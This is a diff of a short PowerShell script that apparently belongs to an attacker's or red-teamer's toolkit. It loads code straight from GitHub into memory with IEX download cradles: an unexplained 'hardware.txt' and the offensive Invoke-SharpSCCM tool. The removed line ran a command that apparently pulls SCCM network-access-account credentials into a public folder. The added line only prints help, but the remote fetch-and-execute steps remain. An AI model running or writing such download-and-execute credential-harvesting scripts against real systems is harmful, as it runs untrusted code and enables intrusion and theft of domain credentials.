@@ -1,6 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
 IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Nimretz/Public/main/hardware.txt");
 IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpSCCM.ps1");
-invoke-sharpSCCM -c "local naa wmi" | out-file -FilePath "c:\users\public\result_sh.txt"
+invoke-sharpSCCM -c "-h" | out-file -FilePath "c:\users\public\result_sh.txt"
 
 
